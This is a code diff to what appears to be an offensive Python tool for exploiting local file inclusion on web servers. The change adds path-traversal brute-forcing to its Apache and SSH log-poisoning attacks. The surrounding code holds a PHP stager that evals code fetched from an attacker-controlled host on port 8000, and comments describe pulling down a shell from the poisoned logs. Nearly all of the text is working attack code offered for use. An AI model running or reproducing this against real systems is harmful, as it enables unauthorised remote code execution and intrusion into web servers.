@@ -18,6 +18,7 @@ from os import system
 t = Terminal()
 
 stager_payload = "<?php eval(file_get_contents('http://{0}:8000/{1}.php'))?>"
+path_traversal_sequences = ['../','..\\','/../','./../']
 
 
 def msf_payload():
@@ -206,11 +207,12 @@ class Expect:
 
 class Logs:
 
-    def __init__(self, target, location, nostager):
+    def __init__(self, target, location, nostager, relative):
 
         self.target = target
         self.location = location  # /var/log/apache2/access.log
         self.nostager = nostager
+        self.relative = relative
 
     def execute_logs(self):
 
@@ -238,19 +240,28 @@ class Logs:
             if r.status_code != 200:
                 print(t.red(" [!] Unexpected HTTP Response "))
             else:
-                r = requests.get(lfi)  # pull down shell from poisoned logs
-                if r.status_code != 200:
-                    print(t.red(" [!] Unexpected HTTP Response "))
+                if not self.relative:
+                    r = requests.get(lfi)  # pull down shell from poisoned logs
+                    if r.status_code != 200:
+                        print(t.red(" [!] Unexpected HTTP Response "))
+                else:
+                    for path_traversal_sequence in path_traversal_sequences:
+                        for counter in xrange(10):
+                            lfi = self.target + path_traversal_sequence*counter + self.location
+                            r = requests.get(lfi)  # pull down shell from poisoned logs
+                            if r.status_code != 200:
+                                print(t.red(" [!] Unexpected HTTP Response "))
         except requests.exceptions.RequestException as access_error:
             print t.red(" [!] HTTP Error ")(access_error)
 
 
 class SSHLogs:
 
-    def __init__(self, target, location):
+    def __init__(self, target, location, relative):
 
         self.target = target
         self.location = location  # /var/log/auth.log
+        self.relative = relative
 
     def execute_ssh(self):
 
@@ -271,14 +282,27 @@ class SSHLogs:
         print(t.red(" [!] ") + "Payload Is Located At: " + t.red("/tmp/{0}.php")).format(shell)
         print(t.green(" [*] ") + "Downloading Shell")
         progressbar()
-        lfi = self.target + self.location + '&code={0}'.format(payload_stage2)
+        
 
-        try:
-            r = requests.get(lfi)  # pull down shell from poisoned logs
-            if r.status_code != 200:
-                print(t.red(" [!] Unexpected HTTP Response "))
-        except requests.exceptions.RequestException as access_error:
-            print t.red(" [!] HTTP Error ")(access_error)
+        if not self.relative:
+            lfi = self.target + self.location + '&code={0}'.format(payload_stage2)
+            try:
+                r = requests.get(lfi)  # pull down shell from poisoned logs
+                if r.status_code != 200:
+                    print(t.red(" [!] Unexpected HTTP Response "))
+            except requests.exceptions.RequestException as access_error:
+                print t.red(" [!] HTTP Error ")(access_error)
+
+        else:
+            for path_traversal_sequence in path_traversal_sequences:
+                for counter in xrange(10):
+                    lfi = self.target + path_traversal_sequence*counter + self.location + '&code={0}'.format(payload_stage2)
+                    try:
+                        r = requests.get(lfi)  # pull down shell from poisoned logs
+                        if r.status_code != 200:
+                            print(t.red(" [!] Unexpected HTTP Response "))
+                    except requests.exceptions.RequestException as access_error:
+                        print t.red(" [!] HTTP Error ")(access_error)
 
 
 class Filter:
